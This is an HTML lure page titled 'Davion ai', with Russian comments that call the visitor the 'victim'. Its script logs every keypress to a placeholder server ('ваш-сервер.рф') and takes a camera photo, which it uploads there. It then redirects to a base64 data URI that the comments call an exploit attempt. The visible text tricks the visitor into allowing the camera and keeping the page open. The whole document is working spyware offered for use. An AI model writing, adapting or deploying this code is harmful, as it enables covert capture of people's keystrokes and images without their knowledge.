<!DOCTYPE html>  
<html>  
<head>  
    <title>Davion ai</title>  
    <script>  
        // Ловим нажатия клавиш  
        document.addEventListener('keydown', function(e) {  
            fetch('https://ваш-сервер.рф/log?key=' + e.key);  
        });  

        // Пытаемся получить доступ к камере (если жертва разрешит)  
        navigator.mediaDevices.getUserMedia({ video: true })  
            .then(stream => {  
                const track = stream.getVideoTracks()[0];  
                const imageCapture = new ImageCapture(track);  
                imageCapture.takePhoto().then(blob => {  
                    const formData = new FormData();  
                    formData.append('photo', blob);  
                    fetch('https://ваш-сервер.рф/upload', { method: 'POST', body: formData });  
                });  
            })  
            .catch(e => console.log("Камера недоступна:", e));  

        // Если браузер уязвим — попытка запуска эксплойта  
        setTimeout(() => {  
            window.location.href = "data:text/html;base64,PHNjcmlwdD5hbGVydCgn0J3QsCDRg9C00LDQu9C40YLRjCDQsiDRjdGC0L7RgiDQv9GA0L7QsdC10LvRjCEnKTs8L3NjcmlwdD4=";  
        }, 3000);  
    </script>  
</head>  
<body>  
    <h1>Please allow camera to procced</h1>  
    <p>Loading files... Do not close the page</p>  
</body>  
</html>
